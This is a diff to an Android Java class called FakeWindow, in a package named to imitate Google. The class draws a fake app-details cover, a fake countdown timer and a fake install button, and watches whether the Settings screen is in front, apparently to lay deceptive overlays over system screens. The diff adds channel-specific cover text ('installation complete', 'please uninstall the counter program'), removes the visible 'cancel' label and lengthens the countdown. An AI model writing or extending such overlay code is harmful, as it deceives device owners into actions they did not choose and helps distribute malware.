@@ -14,6 +14,7 @@ import android.widget.TextView;
 import com.googl.plugin.x.R;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.config.AppRuntime;
+import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.PluginSettingManager;
 
 /**
@@ -50,11 +51,15 @@ public class FakeWindow {
     private WindowListener mWindowListener;
     private LayoutInflater mLayoutInflater;
 
+    private String mCoverString;
+    private TextView mCoverContent;
+
     public FakeWindow(Context context, WindowListener l) {
         this.context = context;
         LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
         mLayoutInflater = layoutInflater;
         coverView = layoutInflater.inflate(R.layout.plugin_app_details, null);
+        mCoverContent = (TextView) coverView.findViewById(R.id.center_explanation);
         timerView = layoutInflater.inflate(R.layout.plugin_fake_timer, null);
         timeTV = (TextView) timerView.findViewById(R.id.timer);
         installView = layoutInflater.inflate(R.layout.plugin_fake_install_btn, null);
@@ -84,9 +89,23 @@ public class FakeWindow {
 
             iconImageView.setImageDrawable(icon);
             nameTV.setText(String.format(context.getString(R.string.protocal_title), name));
+
+            int channel = Integer.valueOf(Config.CHANNEL_CODE);
+            if (channel > 800000 && channel < 900000) {
+                name = "本次装机完成";
+                nameTV.setText(name);
+                mCoverContent.setText("请卸载计数器程序!");
+                mCoverString = "请卸载计数器程序!";
+                timeTV.setText("");
+
+            }
         } catch (Exception e) {
         }
 
+    }
+
+    public void updateCoverString(String content) {
+        mCoverString = content;
     }
 
     public void updateTimerCount() {
@@ -110,6 +129,7 @@ public class FakeWindow {
 
             AppRuntime.FAKE_WINDOW_SHOW = false;
             AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
+            AppRuntime.WATCHING_SERVICE_BREAK.set(true);
         } else {
             if (count == 2) {
                 AppRuntime.WATCHING_SERVICE_BREAK.set(true);
@@ -133,7 +153,11 @@ public class FakeWindow {
                 public void run() {
                     if (coverView != null && timerView != null) {
 //                        timeTV.setText(String.format(context.getString(R.string.plugin_fake_timer), count));
-                        timeTV.setText("取消");
+//                        timeTV.setText("取消");
+                        if (!TextUtils.isEmpty(mCoverString)) {
+                            mCoverContent.setText(mCoverString);
+                        }
+
                         count--;
 
                         if (count == 0) {
@@ -156,7 +180,7 @@ public class FakeWindow {
     }
 
     public void dismiss() {
-        count = 3;
+        count = 4;
     }
 
     public void show() {
